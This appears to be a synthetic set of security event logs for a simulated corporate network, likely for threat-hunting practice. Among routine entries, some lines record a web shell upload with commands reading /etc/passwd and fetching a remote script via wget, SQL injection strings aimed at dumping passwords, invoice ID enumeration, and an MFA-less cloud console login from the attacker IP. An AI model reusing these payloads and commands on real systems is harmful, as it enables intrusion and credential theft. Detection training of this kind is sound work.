{"_time": "2026-10-02T12:06:00Z", "sourcetype": "firewall", "index": "network", "host": "FW-EDGE01", "action": "allowed", "src_ip": "10.10.43.23", "dest_ip": "104.18.32.9", "dest_port": 443, "protocol": "TCP", "bytes_sent": 919, "bytes_received": 73482}
{"_time": "2026-10-02T12:10:00Z", "sourcetype": "proxy", "index": "web", "host": "PROXY01", "src_ip": "10.10.42.34", "url": "https://intranet.corp.local/page14", "method": "GET", "status": 200, "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/128.0 Safari/537.36", "bytes_out": 570}
{"_time": "2026-10-02T12:10:00Z", "sourcetype": "aws:cloudtrail", "index": "cloud", "eventName": "GetObject", "userIdentity_userName": "svc-ci-deploy", "sourceIPAddress": "10.10.70.5", "awsRegion": "us-east-1"}
{"_time": "2026-10-02T12:13:03Z", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "index": "windows", "host": "WS-FIN-014", "EventCode": 1, "User": "CORP\\it_admin", "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "(normal user application launch)"}
{"_time": "2026-10-02T12:15:00Z", "sourcetype": "dns", "index": "network", "host": "DNS01", "src_ip": "10.10.42.22", "query": "cdn.jsdelivr.net", "answer": "104.18.32.9", "record_type": "A", "response_code": "NOERROR"}
{"_time": "2026-10-02T12:15:00Z", "sourcetype": "proxy", "index": "web", "host": "PROXY01", "src_ip": "10.10.43.23", "url": "https://intranet.corp.local/page3", "method": "GET", "status": 200, "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/128.0 Safari/537.36", "bytes_out": 470}
{"_time": "2026-10-02T12:15:00Z", "sourcetype": "db_audit", "index": "app", "host": "SQLSRV01", "db_user": "app_svc", "query_type": "SELECT", "table": "orders", "rows_returned": 14, "client_ip": "10.10.60.15"}
{"_time": "2026-10-02T12:17:00Z", "sourcetype": "db_audit", "index": "app", "host": "SQLSRV01", "db_user": "app_svc", "query_type": "INSERT", "table": "audit_log", "rows_returned": 113, "client_ip": "10.10.60.15"}
{"_time": "2026-10-02T12:22:00Z", "sourcetype": "firewall", "index": "network", "host": "FW-EDGE01", "action": "allowed", "src_ip": "10.10.45.31", "dest_ip": "104.18.32.9", "dest_port": 443, "protocol": "TCP", "bytes_sent": 2732, "bytes_received": 56987}
{"_time": "2026-10-02T12:26:00Z", "sourcetype": "aws:cloudtrail", "index": "cloud", "eventName": "ListBuckets", "userIdentity_userName": "svc-ci-deploy", "sourceIPAddress": "10.10.70.5", "awsRegion": "us-east-1"}
{"_time": "2026-10-02T12:27:43Z", "sourcetype": "WinEventLog:Security", "index": "windows", "host": "WS-HR-003", "EventCode": 4634, "TargetUserName": "rfischer", "LogonId": "0xcec9e"}
{"_time": "2026-10-02T12:29:00Z", "sourcetype": "email", "index": "web", "host": "MAIL-GW01", "sender": "no-reply@github.com", "recipient": "pwong@corp.local", "subject": "Automated notification", "attachment": "none", "url": "none", "spf": "pass", "dkim": "pass", "verdict": "clean"}
{"_time": "2026-10-02T12:29:20Z", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "index": "windows", "host": "WS-FIN-014", "EventCode": 1, "User": "CORP\\pwong", "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "(normal user application launch)"}
{"_time": "2026-10-02T12:30:00Z", "sourcetype": "proxy", "index": "web", "host": "PROXY01", "src_ip": "10.10.70.55", "url": "https://outlook.office.com/mail/", "method": "GET", "status": 200, "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/128.0 Safari/537.36", "bytes_out": 3394}
{"_time": "2026-10-02T12:31:00Z", "sourcetype": "db_audit", "index": "app", "host": "SQLSRV01", "db_user": "app_svc", "query_type": "SELECT", "table": "orders", "rows_returned": 39, "client_ip": "10.10.60.15"}
{"_time": "2026-10-02T12:32:31Z", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "index": "windows", "host": "WS-FIN-014", "EventCode": 1, "User": "CORP\\pwong", "Image": "C:\\Windows\\System32\\notepad.exe", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "(normal user application launch)"}
{"_time": "2026-10-02T12:38:00Z", "sourcetype": "firewall", "index": "network", "host": "FW-EDGE01", "action": "allowed", "src_ip": "10.10.41.39", "dest_ip": "104.18.32.9", "dest_port": 443, "protocol": "TCP", "bytes_sent": 2056, "bytes_received": 14676}
{"_time": "2026-10-02T12:40:00Z", "sourcetype": "app:auth", "index": "web", "host": "APP-PORTAL01", "username": "svc_backup", "src_ip": "10.10.44.24", "endpoint": "/api/login", "method": "POST", "status": 200, "response_time_ms": 154, "auth_result": "success"}
{"_time": "2026-10-02T12:42:31Z", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "index": "windows", "host": "WS-ENG-021", "EventCode": 1, "User": "CORP\\it_admin", "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "(normal user application launch)"}
{"_time": "2026-10-02T12:43:53Z", "sourcetype": "proxy", "index": "web", "host": "PROXY01", "src_ip": "10.10.57.52", "url": "https://news.ycombinator.com/", "method": "GET", "status": 200, "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/128.0 Safari/537.36", "bytes_out": 1144}
{"_time": "2026-10-02T12:45:00Z", "sourcetype": "proxy", "index": "web", "host": "PROXY01", "src_ip": "10.10.43.29", "url": "https://intranet.corp.local/page9", "method": "GET", "status": 200, "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/128.0 Safari/537.36", "bytes_out": 280}
{"_time": "2026-10-02T12:45:00Z", "sourcetype": "db_audit", "index": "app", "host": "SQLSRV01", "db_user": "app_svc", "query_type": "SELECT", "table": "orders", "rows_returned": 5, "client_ip": "10.10.60.15"}
{"_time": "2026-10-02T12:49:41Z", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "index": "windows", "host": "WS-SALES-009", "EventCode": 1, "User": "CORP\\tOlawale", "Image": "C:\\Windows\\System32\\notepad.exe", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "(normal user application launch)"}
{"_time": "2026-10-02T12:50:00Z", "sourcetype": "app:auth", "index": "web", "host": "APP-PORTAL01", "username": "asmith", "src_ip": "10.10.45.31", "endpoint": "/api/login", "method": "POST", "status": 200, "response_time_ms": 173, "auth_result": "success"}
{"_time": "2026-10-02T12:52:00Z", "sourcetype": "app:auth", "index": "web", "host": "APP-PORTAL01", "username": "tOlawale", "src_ip": "10.10.41.68", "endpoint": "/api/dashboard", "method": "GET", "status": 200, "response_time_ms": 140, "auth_result": "n/a"}
{"_time": "2026-10-02T12:59:42Z", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "index": "windows", "host": "WS-SALES-009", "EventCode": 1, "User": "CORP\\tOlawale", "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "(normal user application launch)"}
{"_time": "2026-10-02T13:01:11Z", "sourcetype": "proxy", "index": "web", "host": "PROXY01", "src_ip": "10.10.63.52", "url": "https://stackoverflow.com/questions/12345", "method": "GET", "status": 200, "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/128.0 Safari/537.36", "bytes_out": 2232}
{"_time": "2026-10-02T13:04:42Z", "sourcetype": "proxy", "index": "web", "host": "PROXY01", "src_ip": "10.10.69.52", "url": "https://intranet.corp.local/wiki", "method": "GET", "status": 200, "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/128.0 Safari/537.36", "bytes_out": 2771}
{"_time": "2026-10-02T13:08:00Z", "sourcetype": "firewall", "index": "network", "host": "FW-EDGE01", "action": "allowed", "src_ip": "10.10.44.24", "dest_ip": "104.18.32.9", "dest_port": 443, "protocol": "TCP", "bytes_sent": 856, "bytes_received": 79397}
{"_time": "2026-10-02T13:10:00Z", "sourcetype": "aws:cloudtrail", "index": "cloud", "eventName": "GetObject", "userIdentity_userName": "svc-ci-deploy", "sourceIPAddress": "10.10.70.5", "awsRegion": "us-east-1"}
{"_time": "2026-10-02T13:11:00Z", "sourcetype": "dns", "index": "network", "host": "DNS01", "src_ip": "10.10.63.76", "query": "windowsupdate.microsoft.com", "answer": "13.77.158.207", "record_type": "A", "response_code": "NOERROR"}
{"_time": "2026-10-02T13:14:11Z", "sourcetype": "proxy", "index": "web", "host": "PROXY01", "src_ip": "10.10.65.99", "url": "https://intranet.corp.local/wiki", "method": "GET", "status": 200, "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/128.0 Safari/537.36", "bytes_out": 4005}
{"_time": "2026-10-02T13:15:00Z", "sourcetype": "dns", "index": "network", "host": "DNS01", "src_ip": "10.10.43.23", "query": "cdn.jsdelivr.net", "answer": "104.18.32.9", "record_type": "A", "response_code": "NOERROR"}
{"_time": "2026-10-02T13:15:16Z", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "index": "windows", "host": "WS-IT-002", "EventCode": 1, "User": "CORP\\it_admin", "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "(normal user application launch)"}
{"_time": "2026-10-02T13:16:00Z", "sourcetype": "dns", "index": "network", "host": "DNS01", "src_ip": "10.10.66.20", "query": "npmjs.org", "answer": "13.61.192.139", "record_type": "A", "response_code": "NOERROR"}
{"_time": "2026-10-02T13:18:10Z", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "index": "windows", "host": "WS-HR-003", "EventCode": 1, "User": "CORP\\it_admin", "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "(normal user application launch)"}
{"_time": "2026-10-02T13:20:00Z", "sourcetype": "proxy", "index": "web", "host": "PROXY01", "src_ip": "10.10.44.24", "url": "https://intranet.corp.local/page4", "method": "GET", "status": 200, "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/128.0 Safari/537.36", "bytes_out": 244}
{"_time": "2026-10-02T13:20:00Z", "sourcetype": "db_audit", "index": "app", "host": "SQLSRV01", "db_user": "app_svc", "query_type": "SELECT", "table": "orders", "rows_returned": 43, "client_ip": "10.10.60.15"}
{"_time": "2026-10-02T13:21:00Z", "sourcetype": "app:auth", "index": "web", "host": "APP-PORTAL01", "username": "tOlawale", "src_ip": "10.10.48.10", "endpoint": "/api/reports/weekly", "method": "GET", "status": 200, "response_time_ms": 245, "auth_result": "n/a"}
{"_time": "2026-10-02T13:21:34Z", "sourcetype": "proxy", "index": "web", "host": "PROXY01", "src_ip": "10.10.54.63", "url": "https://news.ycombinator.com/", "method": "GET", "status": 200, "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/128.0 Safari/537.36", "bytes_out": 1894}
{"_time": "2026-10-02T13:22:55Z", "sourcetype": "WinEventLog:Security", "index": "windows", "host": "WS-SALES-009", "EventCode": 4634, "TargetUserName": "dnair", "LogonId": "0xd1016"}
{"_time": "2026-10-02T13:24:00Z", "sourcetype": "firewall", "index": "network", "host": "FW-EDGE01", "action": "allowed", "src_ip": "10.10.40.32", "dest_ip": "104.18.32.9", "dest_port": 443, "protocol": "TCP", "bytes_sent": 1402, "bytes_received": 60878}
{"_time": "2026-10-02T13:24:57Z", "sourcetype": "proxy", "index": "web", "host": "PROXY01", "src_ip": "10.10.64.84", "url": "https://news.ycombinator.com/", "method": "GET", "status": 200, "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/128.0 Safari/537.36", "bytes_out": 4916}
{"_time": "2026-10-02T13:34:47Z", "sourcetype": "proxy", "index": "web", "host": "PROXY01", "src_ip": "10.10.63.79", "url": "https://intranet.corp.local/wiki", "method": "GET", "status": 200, "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/128.0 Safari/537.36", "bytes_out": 2006}
{"_time": "2026-10-02T13:36:00Z", "sourcetype": "firewall", "index": "network", "host": "FW-EDGE01", "action": "allowed", "src_ip": "10.10.61.33", "dest_ip": "140.82.112.3", "dest_port": 443, "protocol": "TCP", "bytes_sent": 6236, "bytes_received": 22701}
{"_time": "2026-10-02T13:41:00Z", "sourcetype": "email", "index": "web", "host": "MAIL-GW01", "sender": "notifications@slack.com", "recipient": "rfischer@corp.local", "subject": "Automated notification", "attachment": "none", "url": "none", "spf": "pass", "dkim": "pass", "verdict": "clean"}
{"_time": "2026-10-02T13:50:00Z", "sourcetype": "proxy", "index": "web", "host": "PROXY01", "src_ip": "10.10.44.30", "url": "https://intranet.corp.local/page10", "method": "GET", "status": 200, "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/128.0 Safari/537.36", "bytes_out": 765}
{"_time": "2026-10-02T13:50:00Z", "sourcetype": "app:auth", "index": "web", "host": "APP-PORTAL01", "username": "intern_kpatel", "src_ip": "10.10.45.25", "endpoint": "/api/login", "method": "POST", "status": 200, "response_time_ms": 100, "auth_result": "success"}
{"_time": "2026-10-02T13:54:35Z", "sourcetype": "WinEventLog:Security", "index": "windows", "host": "WS-ENG-021", "EventCode": 4634, "TargetUserName": "kgupta", "LogonId": "0xc5354"}
{"_time": "2026-10-02T14:02:10Z", "sourcetype": "proxy", "index": "web", "host": "PROXY01", "src_ip": "203.0.113.90", "url": "https://portal.corp-public.com/upload.php", "method": "POST", "status": 200, "user_agent": "curl/8.4.0", "bytes_out": 4200}
{"_time": "2026-10-02T14:02:40Z", "sourcetype": "proxy", "index": "web", "host": "PROXY01", "src_ip": "203.0.113.90", "url": "https://portal.corp-public.com/uploads/sh3ll.php?cmd=whoami", "method": "GET", "status": 200, "user_agent": "curl/8.4.0", "bytes_out": 90}
{"_time": "2026-10-02T14:03:05Z", "sourcetype": "proxy", "index": "web", "host": "PROXY01", "src_ip": "203.0.113.90", "url": "https://portal.corp-public.com/uploads/sh3ll.php?cmd=cat+/etc/passwd", "method": "GET", "status": 200, "user_agent": "curl/8.4.0", "bytes_out": 1200}
{"_time": "2026-10-02T14:03:30Z", "sourcetype": "proxy", "index": "web", "host": "PROXY01", "src_ip": "203.0.113.90", "url": "https://portal.corp-public.com/uploads/sh3ll.php?cmd=wget+http://185.220.101.44/x2.sh", "method": "GET", "status": 200, "user_agent": "curl/8.4.0", "bytes_out": 90}
{"_time": "2026-10-02T14:04:00Z", "sourcetype": "db_audit", "index": "app", "host": "SQLSRV01", "db_user": "app_svc", "query_type": "INSERT", "table": "inventory", "rows_returned": 68, "client_ip": "10.10.60.15"}
{"_time": "2026-10-02T14:04:57Z", "sourcetype": "WinEventLog:Security", "index": "windows", "host": "WS-HR-003", "EventCode": 4634, "TargetUserName": "intern_kpatel", "LogonId": "0xb4236"}
{"_time": "2026-10-02T14:05:42Z", "sourcetype": "WinEventLog:Security", "index": "windows", "host": "WS-FIN-014", "EventCode": 4634, "TargetUserName": "pwong", "LogonId": "0xbc1fc"}
{"_time": "2026-10-02T14:10:00Z", "sourcetype": "firewall", "index": "network", "host": "FW-EDGE01", "action": "allowed", "src_ip": "10.10.45.25", "dest_ip": "104.18.32.9", "dest_port": 443, "protocol": "TCP", "bytes_sent": 2228, "bytes_received": 6165}
{"_time": "2026-10-02T14:10:00Z", "sourcetype": "aws:cloudtrail", "index": "cloud", "eventName": "DescribeInstances", "userIdentity_userName": "svc-ci-deploy", "sourceIPAddress": "10.10.70.5", "awsRegion": "us-east-1"}
{"_time": "2026-10-02T14:10:29Z", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "index": "windows", "host": "WS-HR-003", "EventCode": 1, "User": "CORP\\svc_backup", "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "(normal user application launch)"}
{"_time": "2026-10-02T14:13:59Z", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "index": "windows", "host": "WS-ENG-021", "EventCode": 1, "User": "CORP\\kgupta", "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "(normal user application launch)"}
{"_time": "2026-10-02T14:15:00Z", "sourcetype": "dns", "index": "network", "host": "DNS01", "src_ip": "10.10.44.24", "query": "cdn.jsdelivr.net", "answer": "104.18.32.9", "record_type": "A", "response_code": "NOERROR"}
{"_time": "2026-10-02T14:24:38Z", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "index": "windows", "host": "WS-ENG-021", "EventCode": 1, "User": "CORP\\mchen", "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "(normal user application launch)"}
{"_time": "2026-10-02T14:25:00Z", "sourcetype": "proxy", "index": "web", "host": "PROXY01", "src_ip": "10.10.45.25", "url": "https://intranet.corp.local/page5", "method": "GET", "status": 200, "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/128.0 Safari/537.36", "bytes_out": 670}
{"_time": "2026-10-02T14:25:00Z", "sourcetype": "db_audit", "index": "app", "host": "SQLSRV01", "db_user": "app_svc", "query_type": "SELECT", "table": "orders", "rows_returned": 18, "client_ip": "10.10.60.15"}
{"_time": "2026-10-02T14:26:00Z", "sourcetype": "firewall", "index": "network", "host": "FW-EDGE01", "action": "allowed", "src_ip": "10.10.41.33", "dest_ip": "104.18.32.9", "dest_port": 443, "protocol": "TCP", "bytes_sent": 2913, "bytes_received": 38463}
{"_time": "2026-10-02T14:26:56Z", "sourcetype": "proxy", "index": "web", "host": "PROXY01", "src_ip": "10.10.60.83", "url": "https://docs.google.com/document/d/abc123", "method": "GET", "status": 200, "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/128.0 Safari/537.36", "bytes_out": 3345}
{"_time": "2026-10-02T14:28:43Z", "sourcetype": "proxy", "index": "web", "host": "PROXY01", "src_ip": "10.10.46.75", "url": "https://stackoverflow.com/questions/12345", "method": "GET", "status": 200, "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/128.0 Safari/537.36", "bytes_out": 1590}
{"_time": "2026-10-02T14:29:55Z", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "index": "windows", "host": "WS-IT-002", "EventCode": 1, "User": "CORP\\dnair", "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "(normal user application launch)"}
{"_time": "2026-10-02T14:36:00Z", "sourcetype": "dns", "index": "network", "host": "DNS01", "src_ip": "10.10.59.95", "query": "npmjs.org", "answer": "13.81.8.127", "record_type": "A", "response_code": "NOERROR"}
{"_time": "2026-10-02T14:41:01Z", "sourcetype": "WinEventLog:Security", "index": "windows", "host": "WS-HR-003", "EventCode": 4634, "TargetUserName": "rfischer", "LogonId": "0xf1528"}
{"_time": "2026-10-02T14:42:33Z", "sourcetype": "proxy", "index": "web", "host": "PROXY01", "src_ip": "10.10.57.86", "url": "https://outlook.office.com/mail/", "method": "GET", "status": 200, "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/128.0 Safari/537.36", "bytes_out": 3825}
{"_time": "2026-10-02T14:42:37Z", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "index": "windows", "host": "WS-ENG-021", "EventCode": 1, "User": "CORP\\mchen", "Image": "C:\\Windows\\System32\\notepad.exe", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "(normal user application launch)"}
{"_time": "2026-10-02T14:42:41Z", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "index": "windows", "host": "WS-SALES-009", "EventCode": 1, "User": "CORP\\svc_backup", "Image": "C:\\Windows\\System32\\notepad.exe", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "(normal user application launch)"}
{"_time": "2026-10-02T14:44:00Z", "sourcetype": "dns", "index": "network", "host": "DNS01", "src_ip": "10.10.48.57", "query": "teams.microsoft.com", "answer": "13.98.156.247", "record_type": "A", "response_code": "NOERROR"}
{"_time": "2026-10-02T14:44:00Z", "sourcetype": "db_audit", "index": "app", "host": "SQLSRV01", "db_user": "app_svc", "query_type": "INSERT", "table": "audit_log", "rows_returned": 75, "client_ip": "10.10.60.15"}
{"_time": "2026-10-02T14:53:17Z", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "index": "windows", "host": "WS-HR-003", "EventCode": 1, "User": "CORP\\mchen", "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "(normal user application launch)"}
{"_time": "2026-10-02T14:55:00Z", "sourcetype": "proxy", "index": "web", "host": "PROXY01", "src_ip": "10.10.45.31", "url": "https://intranet.corp.local/page11", "method": "GET", "status": 200, "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/128.0 Safari/537.36", "bytes_out": 500}
{"_time": "2026-10-02T14:57:00Z", "sourcetype": "firewall", "index": "network", "host": "FW-EDGE01", "action": "allowed", "src_ip": "10.10.49.96", "dest_ip": "140.82.112.3", "dest_port": 443, "protocol": "TCP", "bytes_sent": 2920, "bytes_received": 117796}
{"_time": "2026-10-02T14:57:10Z", "sourcetype": "proxy", "index": "web", "host": "PROXY01", "src_ip": "10.10.63.70", "url": "https://stackoverflow.com/questions/12345", "method": "GET", "status": 200, "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/128.0 Safari/537.36", "bytes_out": 2323}
{"_time": "2026-10-02T14:57:37Z", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "index": "windows", "host": "WS-SALES-009", "EventCode": 1, "User": "CORP\\kgupta", "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "(normal user application launch)"}
{"_time": "2026-10-02T15:00:00Z", "sourcetype": "app:auth", "index": "web", "host": "APP-PORTAL01", "username": "dnair", "src_ip": "10.10.40.26", "endpoint": "/api/login", "method": "POST", "status": 200, "response_time_ms": 139, "auth_result": "success"}
{"_time": "2026-10-02T15:01:07Z", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "index": "windows", "host": "WS-ENG-021", "EventCode": 1, "User": "CORP\\intern_kpatel", "Image": "C:\\Windows\\System32\\notepad.exe", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "(normal user application launch)"}
{"_time": "2026-10-02T15:07:15Z", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "index": "windows", "host": "WS-MKT-007", "EventCode": 1, "User": "CORP\\tOlawale", "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "(normal user application launch)"}
{"_time": "2026-10-02T15:10:00Z", "sourcetype": "aws:cloudtrail", "index": "cloud", "eventName": "DescribeInstances", "userIdentity_userName": "svc-ci-deploy", "sourceIPAddress": "10.10.70.5", "awsRegion": "us-east-1"}
{"_time": "2026-10-02T15:12:00Z", "sourcetype": "firewall", "index": "network", "host": "FW-EDGE01", "action": "allowed", "src_ip": "10.10.40.26", "dest_ip": "104.18.32.9", "dest_port": 443, "protocol": "TCP", "bytes_sent": 622, "bytes_received": 14280}
{"_time": "2026-10-02T15:14:12Z", "sourcetype": "proxy", "index": "web", "host": "PROXY01", "src_ip": "10.10.66.68", "url": "https://outlook.office.com/mail/", "method": "GET", "status": 200, "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/128.0 Safari/537.36", "bytes_out": 2700}
{"_time": "2026-10-02T15:14:17Z", "sourcetype": "proxy", "index": "web", "host": "PROXY01", "src_ip": "10.10.53.72", "url": "https://news.ycombinator.com/", "method": "GET", "status": 200, "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/128.0 Safari/537.36", "bytes_out": 3385}
{"_time": "2026-10-02T15:15:00Z", "sourcetype": "dns", "index": "network", "host": "DNS01", "src_ip": "10.10.45.25", "query": "cdn.jsdelivr.net", "answer": "104.18.32.9", "record_type": "A", "response_code": "NOERROR"}
{"_time": "2026-10-02T15:18:27Z", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "index": "windows", "host": "WS-MKT-007", "EventCode": 1, "User": "CORP\\svc_backup", "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "(normal user application launch)"}
{"_time": "2026-10-02T15:25:15Z", "sourcetype": "proxy", "index": "web", "host": "PROXY01", "src_ip": "10.10.44.93", "url": "https://news.ycombinator.com/", "method": "GET", "status": 200, "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/128.0 Safari/537.36", "bytes_out": 1073}
{"_time": "2026-10-02T15:25:56Z", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "index": "windows", "host": "WS-FIN-014", "EventCode": 1, "User": "CORP\\pwong", "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "(normal user application launch)"}
{"_time": "2026-10-02T15:28:00Z", "sourcetype": "firewall", "index": "network", "host": "FW-EDGE01", "action": "allowed", "src_ip": "10.10.42.34", "dest_ip": "104.18.32.9", "dest_port": 443, "protocol": "TCP", "bytes_sent": 526, "bytes_received": 22926}
{"_time": "2026-10-02T15:30:00Z", "sourcetype": "db_audit", "index": "app", "host": "SQLSRV01", "db_user": "app_svc", "query_type": "UPDATE", "table": "sessions", "rows_returned": 48, "client_ip": "10.10.60.15"}
{"_time": "2026-10-02T15:30:00Z", "sourcetype": "app:auth", "index": "web", "host": "APP-PORTAL01", "username": "it_admin", "src_ip": "10.10.54.80", "endpoint": "/api/profile", "method": "GET", "status": 200, "response_time_ms": 158, "auth_result": "n/a"}
{"_time": "2026-10-02T15:35:10Z", "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", "index": "windows", "host": "WS-FIN-014", "EventCode": 1, "User": "CORP\\pwong", "Image": "C:\\Windows\\System32\\notepad.exe", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "(normal user application launch)"}
{"_time": "2026-10-02T15:40:00Z", "sourcetype": "app:auth", "index": "web", "host": "APP-PORTAL01", "username": "rfischer", "src_ip": "10.10.64.16", "endpoint": "/api/profile", "method": "GET", "status": 200, "response_time_ms": 128, "auth_result": "n/a"}
{"_time": "2026-10-02T15:40:02Z", "sourcetype": "app:auth", "index": "web", "host": "APP-PORTAL01", "username": "-", "src_ip": "203.0.113.90", "endpoint": "/api/report?id=5' OR '1'='1", "method": "GET", "status": 500, "response_time_ms": 45, "auth_result": "n/a"}
{"_time": "2026-10-02T15:40:10Z", "sourcetype": "app:auth", "index": "web", "host": "APP-PORTAL01", "username": "-", "src_ip": "203.0.113.90", "endpoint": "/api/report?id=5 UNION SELECT username,password FROM users--", "method": "GET", "status": 500, "response_time_ms": 52, "auth_result": "n/a"}
{"_time": "2026-10-02T15:42:00Z", "sourcetype": "app:auth", "index": "web", "host": "APP-PORTAL01", "username": "mchen", "src_ip": "10.10.5.34", "endpoint": "/api/invoices/9000", "method": "GET", "status": 200, "response_time_ms": 100, "auth_result": "n/a"}
{"_time": "2026-10-02T15:43:00Z", "sourcetype": "app:auth", "index": "web", "host": "APP-PORTAL01", "username": "mchen", "src_ip": "10.10.5.34", "endpoint": "/api/invoices/9001", "method": "GET", "status": 200, "response_time_ms": 100, "auth_result": "n/a"}
{"_time": "2026-10-02T15:44:00Z", "sourcetype": "app:auth", "index": "web", "host": "APP-PORTAL01", "username": "mchen", "src_ip": "10.10.5.34", "endpoint": "/api/invoices/9002", "method": "GET", "status": 200, "response_time_ms": 100, "auth_result": "n/a"}
{"_time": "2026-10-02T15:45:00Z", "sourcetype": "app:auth", "index": "web", "host": "APP-PORTAL01", "username": "mchen", "src_ip": "10.10.5.34", "endpoint": "/api/invoices/9003", "method": "GET", "status": 403, "response_time_ms": 100, "auth_result": "n/a"}
{"_time": "2026-10-02T15:46:00Z", "sourcetype": "app:auth", "index": "web", "host": "APP-PORTAL01", "username": "mchen", "src_ip": "10.10.5.34", "endpoint": "/api/invoices/9004", "method": "GET", "status": 403, "response_time_ms": 100, "auth_result": "n/a"}
{"_time": "2026-10-02T15:47:00Z", "sourcetype": "app:auth", "index": "web", "host": "APP-PORTAL01", "username": "mchen", "src_ip": "10.10.5.34", "endpoint": "/api/invoices/9005", "method": "GET", "status": 403, "response_time_ms": 100, "auth_result": "n/a"}
{"_time": "2026-10-02T15:53:00Z", "sourcetype": "linux_secure", "index": "linux", "host": "lnx-db01", "event": "sshd_accepted", "user": "rfischer", "src_ip": "10.10.44.35", "method": "publickey"}
{"_time": "2026-10-02T16:00:00Z", "sourcetype": "aws:cloudtrail", "index": "cloud", "eventName": "ConsoleLogin", "userIdentity_userName": "svc-ci-deploy", "sourceIPAddress": "203.0.113.90", "awsRegion": "us-east-1", "responseElements_ConsoleLogin": "Success", "mfaUsed": "No"}
